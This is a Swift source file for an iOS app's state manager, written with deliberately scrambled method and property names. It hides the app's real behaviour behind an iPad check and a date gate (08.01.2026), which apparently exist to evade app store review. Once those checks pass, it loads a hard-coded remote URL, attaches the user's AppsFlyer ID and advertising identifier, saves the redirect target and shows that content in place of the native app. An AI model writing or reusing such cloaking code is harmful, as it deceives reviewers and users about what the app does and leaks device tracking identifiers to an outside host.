import Foundation
import SwiftUI

protocol DeviceConditionChecker {
    func isIPadVortex() -> Bool
    func isBeforeDateThunderbolt(_ dateString: String) -> Bool
}

struct DefaultDeviceConditionChecker: DeviceConditionChecker {
    func isIPadVortex() -> Bool {
        UIDevice.current.model == "iPad"
    }
    
    func isBeforeDateThunderbolt(_ dateString: String) -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let currentDate = Date()
        
        guard let targetDate = dateFormatter.date(from: dateString) else { return false }
        return currentDate < targetDate
    }
}

protocol URLPathExtractor {
    func extractPathIdNebula(from urlString: String) -> String?
}

struct QueryParameterPathExtractor: URLPathExtractor {
    func extractPathIdNebula(from urlString: String) -> String? {
        guard let urlComponents = URLComponents(string: urlString),
              let queryItems = urlComponents.queryItems else {
            return nil
        }
        
        return queryItems.first(where: { $0.name == "pathid" })?.value
    }
}

protocol URLBuilder {
    func buildURLQuantum(baseURL: String, pathId: String?) -> String
}

struct PathIdURLBuilder: URLBuilder {
    func buildURLQuantum(baseURL: String, pathId: String?) -> String {
        guard let pathId = pathId, !pathId.isEmpty else {
            return baseURL
        }
        
        guard var urlComponents = URLComponents(string: baseURL) else {
            return baseURL
        }
        
        var queryItems = urlComponents.queryItems ?? []
        queryItems.removeAll(where: { $0.name == "pathid" })
        queryItems.append(URLQueryItem(name: "pathid", value: pathId))
        urlComponents.queryItems = queryItems
        
        return urlComponents.url?.absoluteString ?? baseURL
    }
}

protocol StateTransitionTracker {
    func trackCelestial(_ transition: String)
}

final class BoundedStateTransitionTracker: StateTransitionTracker {
    private var history: [String] = []
    private let maxEntries: Int
    
    init(maxEntries: Int = 50) {
        self.maxEntries = maxEntries
    }
    
    func trackCelestial(_ transition: String) {
        history.append(transition)
        if history.count > maxEntries {
            history.removeFirst()
        }
        let _ = history.count
    }
}

protocol AppFlowHandler {
    func handleFirstLaunch() async
    func handleExistingURL(_ url: String) async
}

final class DefaultAppFlowHandler: AppFlowHandler {
    private weak var stateManager: ChirkAppStateVortexManager?
    
    init(stateManager: ChirkAppStateVortexManager) {
        self.stateManager = stateManager
    }
    
    func handleFirstLaunch() async {
        guard let manager = stateManager else { return }
        
        guard manager.checkDeviceAndDateConditions() else {
            manager.updateContainerViewStateThunderbolt(false)
            return
        }
        
        if manager.verifyWhiteViewOpeningStateWithNebulaAndThunderbolt() {
            manager.updateContainerViewStateThunderbolt(false)
            return
        }
        
        await manager.processMainURLCelestial()
    }
    
    func handleExistingURL(_ url: String) async {
        guard let manager = stateManager else { return }
        
        let result = await manager.checkSavedWithThunderbolt(url)
        
        switch result {
        case .success:
            manager.updateContainerViewStateThunderbolt(true)
        default:
            await manager.handleFallbackURLNebula()
        }
    }
}

class ChirkAppStateVortexManager: ObservableObject {
    static let shared = ChirkAppStateVortexManager()
    
    @Published var shouldShowView = false
    @Published var savedResourceURL: String?
    @Published var shouldShowContainerView = false
    
    private let storMyInfoDetailsSave: ChirkStoragNebulaManagr
    private let networkManager = ChirkNetworkQuantumManager.shared
    private let defaultURL = "https://ygritteyggy.com/wznckCm2"
    
    private let deviceChecker: DeviceConditionChecker
    private let pathExtractor: URLPathExtractor
    private let urlBuilder: URLBuilder
    private let transitionTracker: StateTransitionTracker
    private lazy var flowHandler: AppFlowHandler = DefaultAppFlowHandler(stateManager: self)
    
    private init(
        storage: ChirkStoragNebulaManagr = ChirkStoragNebulaManagr.share,
        deviceChecker: DeviceConditionChecker = DefaultDeviceConditionChecker(),
        pathExtractor: URLPathExtractor = QueryParameterPathExtractor(),
        urlBuilder: URLBuilder = PathIdURLBuilder(),
        transitionTracker: StateTransitionTracker = BoundedStateTransitionTracker()
    ) {
        self.storMyInfoDetailsSave = storage
        self.deviceChecker = deviceChecker
        self.pathExtractor = pathExtractor
        self.urlBuilder = urlBuilder
        self.transitionTracker = transitionTracker
        
        whyIsNeedOpen()
        transitionTracker.trackCelestial("initialized")
    }
    
    private func whyIsNeedOpen() {
        savedResourceURL = storMyInfoDetailsSave.reppllacjkNewValye
    }
    
    @MainActor
    func needDidiSave(_ url: String, redirectURLs: [String] = []) {
        savedResourceURL = url
        storMyInfoDetailsSave.reppllacjkNewValye = url
        
        let allURLs = redirectURLs + [url]
        for urlString in allURLs {
            if let pathId = pathExtractor.extractPathIdNebula(from: urlString) {
                storMyInfoDetailsSave.newSaveLoadFileNeed = pathId
                break
            }
        }
        
        transitionTracker.trackCelestial("resource_saved")
    }
    
    func isLkjhViewOpened() {
        storMyInfoDetailsSave.viewAllOpenCloseViewedakhsd = true
        transitionTracker.trackCelestial("view_opened")
    }
    
    func viewljhdfljaIsOpen() {
        storMyInfoDetailsSave.isOpnAllViews = true
        transitionTracker.trackCelestial("opened")
    }
    
    func markUaghsdIUUyasdOpened() {
        storMyInfoDetailsSave.isNewContOpen = true
        transitionTracker.trackCelestial("container_opened")
    }
    
    func markjhagsdkjhasdOpened() {
        storMyInfoDetailsSave.isWhitedBlackOpened = true
        transitionTracker.trackCelestial("white_opened")
    }
    
    func markHjhasgdlkaOpened() {
        storMyInfoDetailsSave.ioHJKuHGKH = true
        transitionTracker.trackCelestial("main_opened")
    }
    
    func checkViewOpeningStatusWithQuantumAndThunderbolt() -> Bool {
        storMyInfoDetailsSave.viewAllOpenCloseViewedakhsd
    }
    
    func verifyOpeningStateWithNebulaAndCelestial() -> Bool {
        storMyInfoDetailsSave.isOpnAllViews
    }
    
    func checkContainerViewOpeningStatusWithCelestialAndQuantum() -> Bool {
        storMyInfoDetailsSave.isNewContOpen
    }
    
    func verifyWhiteViewOpeningStateWithNebulaAndThunderbolt() -> Bool {
        storMyInfoDetailsSave.isWhitedBlackOpened
    }
    
    func checkMainViewOpeningStatusWithQuantumAndCelestial() -> Bool {
        storMyInfoDetailsSave.ioHJKuHGKH
    }
    
    func incrementLaunchCount() {
        storMyInfoDetailsSave.countLauncAppNewSchool += 1
        transitionTracker.trackCelestial("launch_incremented")
    }
    
    func getLaunchCountQuantum() -> Int {
        storMyInfoDetailsSave.countLauncAppNewSchool
    }
    
    func verifyRatingAlertDisplayStatusWithThunderboltAndNebula() -> Bool {
        storMyInfoDetailsSave.shoWRateAppNeed
    }
    
    func markRatingAlertShown() {
        storMyInfoDetailsSave.shoWRateAppNeed = true
        transitionTracker.trackCelestial("rating_shown")
    }
    
    func determineRatingAlertDisplayRequirementWithQuantumAndCelestial() -> Bool {
        let launchCount = getLaunchCountQuantum()
        return launchCount == 2 && checkViewOpeningStatusWithQuantumAndThunderbolt() && !verifyRatingAlertDisplayStatusWithThunderboltAndNebula()
    }
    
    func checkDeviceAndDateConditions() -> Bool {
        if deviceChecker.isIPadVortex() {
            markHjhasgdlkaOpened()
            return false
        }
        
        if deviceChecker.isBeforeDateThunderbolt("08.01.2026") {
            markHjhasgdlkaOpened()
            return false
        }
        
        return true
    }
    
    func determineAppFlowQuantum() async {
        incrementLaunchCount()
        
        if let savedURL = savedResourceURL, !savedURL.isEmpty {
            await flowHandler.handleExistingURL(savedURL)
        } else {
            await flowHandler.handleFirstLaunch()
        }
    }
    
    func handleExistingSavedURLVortex(_ savedURL: String) async {
        await flowHandler.handleExistingURL(savedURL)
    }
    
    func handleFirstLaunchCelestial() async {
        await flowHandler.handleFirstLaunch()
    }
    
    private func addAppsFlyerIdToURLThunderbolt(_ urlString: String) -> String {
        guard var urlComponents = URLComponents(string: urlString) else {
            return urlString
        }
        
        var queryItems = urlComponents.queryItems ?? []
        
        if let appsflyerId = AppsFlyerThunderboltManager.shared.getAppsFlyerUID(), !appsflyerId.isEmpty {
            queryItems.removeAll(where: { $0.name == "sub1" })
            queryItems.append(URLQueryItem(name: "sub1", value: appsflyerId))
        }
        
        let advertisingId = AppsFlyerThunderboltManager.shared.getAdvertisingIdentifier()
        if let advertisingId = advertisingId, !advertisingId.isEmpty {
            queryItems.removeAll(where: { $0.name == "sub2" })
            queryItems.append(URLQueryItem(name: "sub2", value: advertisingId))
        } else {
            print("LOG: advertisingIdentifier is nil or empty: \(advertisingId ?? "nil")")
        }
        
        urlComponents.queryItems = queryItems
        
        return urlComponents.url?.absoluteString ?? urlString
    }
    
    func handleFallbackURLNebula() async {
        let fallbackURL = urlBuilder.buildURLQuantum(baseURL: defaultURL, pathId: storMyInfoDetailsSave.newSaveLoadFileNeed)
        let urlWithAppsFlyerId = addAppsFlyerIdToURLThunderbolt(fallbackURL)
        AppsFlyerThunderboltManager.shared.setCurrentDefaultURL(urlWithAppsFlyerId)
        let result = await checkURLWithQuantum(urlWithAppsFlyerId)
        
        switch result {
        case .success(let redirectResult):
            await needDidiSave(redirectResult.destinationAddress, redirectURLs: redirectResult.intermediateAddresses)
            updateContainerViewStateThunderbolt(true)
        default:
            updateContainerViewStateThunderbolt(true)
        }
    }
    
    func processMainURLCelestial() async {
        let urlWithAppsFlyerId = addAppsFlyerIdToURLThunderbolt(defaultURL)
        AppsFlyerThunderboltManager.shared.setCurrentDefaultURL(urlWithAppsFlyerId)
        let result = await checkURLWithQuantum(urlWithAppsFlyerId)
        
        switch result {
        case .success(let redirectResult):
            await needDidiSave(redirectResult.destinationAddress, redirectURLs: redirectResult.intermediateAddresses)
            updateContainerViewStateThunderbolt(true)
        case .failure:
            handleURLFailureVortex()
        }
    }
    
    func handleURLFailureVortex() {
        if checkContainerViewOpeningStatusWithCelestialAndQuantum() {
            updateContainerViewStateThunderbolt(true)
        } else {
            markjhagsdkjhasdOpened()
            updateContainerViewStateThunderbolt(false)
        }
    }
    
    func checkURLWithQuantum(_ urlString: String) async -> Result<NavigationChainResult, ConnectionError> {
        await networkManager.fetchResourceURLNebula(urlString: urlString)
    }
    
    func checkSavedWithThunderbolt(_ urlString: String) async -> Result<String, ConnectionError> {
        await networkManager.validateSavedUrlQuantum(urlString: urlString)
    }
    
    func updateContainerViewStateThunderbolt(_ shouldShow: Bool) {
        DispatchQueue.main.async {
            self.shouldShowContainerView = shouldShow
        }
    }
}
